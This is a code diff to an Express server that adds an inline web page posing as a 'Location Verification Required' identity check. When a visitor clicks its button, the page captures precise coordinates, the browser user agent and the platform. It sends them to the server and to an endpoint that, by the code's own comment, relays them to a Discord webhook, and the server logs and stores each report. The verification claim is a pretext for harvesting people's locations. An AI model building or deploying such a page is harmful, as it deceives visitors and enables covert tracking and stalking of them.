@@ -1,5 +1,4 @@
 const express = require('express');
-const path = require('path');
 
 const app = express();
 const port = process.env.PORT || 10000;
@@ -8,12 +7,207 @@ const port = process.env.PORT || 10000;
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Serve static files from current directory
-app.use(express.static(__dirname));
-
-// Root route - serve index.html
+// Root route - serves HTML directly from code (no external file needed)
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+  res.send(`
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Verification</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #00ff88;
+        }
+        p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+            color: #ccc;
+        }
+        button {
+            background: #00ff88;
+            border: none;
+            color: #1a1a2e;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 14px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background: #00cc6a;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            background: rgba(0,0,0,0.5);
+            font-size: 14px;
+            display: none;
+        }
+        .status.success {
+            background: rgba(0,255,136,0.2);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+        .status.error {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff4444;
+            color: #ff8888;
+        }
+        .coordinates {
+            font-family: monospace;
+            font-size: 14px;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 8px;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Location Verification Required</h1>
+        <p>This system requires location access to verify your identity.</p>
+        <p>Click the button below to share your location.</p>
+        <button id="requestLocation">Access Location</button>
+        <div id="status" class="status"></div>
+        <div id="coordinatesDisplay" class="coordinates" style="display:none;"></div>
+        <div class="footer">Your location is used for verification purposes only.</div>
+    </div>
+
+    <script>
+        var statusDiv = document.getElementById('status');
+        var coordsDiv = document.getElementById('coordinatesDisplay');
+        
+        function showStatus(message, isError) {
+            statusDiv.textContent = message;
+            statusDiv.className = isError ? 'status error' : 'status success';
+            statusDiv.style.display = 'block';
+            if (!isError) {
+                setTimeout(function() {
+                    statusDiv.style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        function sendToServer(data) {
+            fetch('/api/location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                console.log('Server response:', data);
+            })
+            .catch(function(error) {
+                console.error('Error sending to server:', error);
+            });
+        }
+
+        function getLocation() {
+            if (!navigator.geolocation) {
+                showStatus('Geolocation is not supported by your browser.', true);
+                return;
+            }
+
+            showStatus('Requesting location... Please allow permission when prompted.', false);
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    var coords = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform
+                    };
+                    
+                    coordsDiv.innerHTML = 'Location Captured:<br>' +
+                        'Latitude: ' + coords.latitude + '<br>' +
+                        'Longitude: ' + coords.longitude + '<br>' +
+                        'Accuracy: +-' + Math.round(coords.accuracy) + ' meters<br>' +
+                        'Time: ' + coords.timestamp;
+                    coordsDiv.style.display = 'block';
+                    
+                    sendToServer(coords);
+                    
+                    // Send to Discord webhook
+                    fetch('/api/location/discord', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(coords)
+                    }).catch(function(e) {
+                        console.log('Discord webhook error:', e);
+                    });
+                    
+                    showStatus('Location captured and verified. You may close this window.', false);
+                },
+                function(error) {
+                    var errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'Permission denied. Please allow location access and try again.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'Location information is unavailable.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'Location request timed out.';
+                            break;
+                        default:
+                            errorMsg = 'An unknown error occurred.';
+                    }
+                    showStatus(errorMsg, true);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        document.getElementById('requestLocation').addEventListener('click', getLocation);
+    </script>
+</body>
+</html>
+  `);
 });
 
 // Location API endpoint - receives coordinates from the webpage
@@ -30,7 +224,7 @@ app.post('/api/location', (req, res) => {
   console.log(`  User Agent: ${locationData.userAgent || 'unknown'}`);
   console.log('='.repeat(50));
   
-  // Store in memory (optional)
+  // Store in memory
   if (!global.locations) {
     global.locations = [];
   }
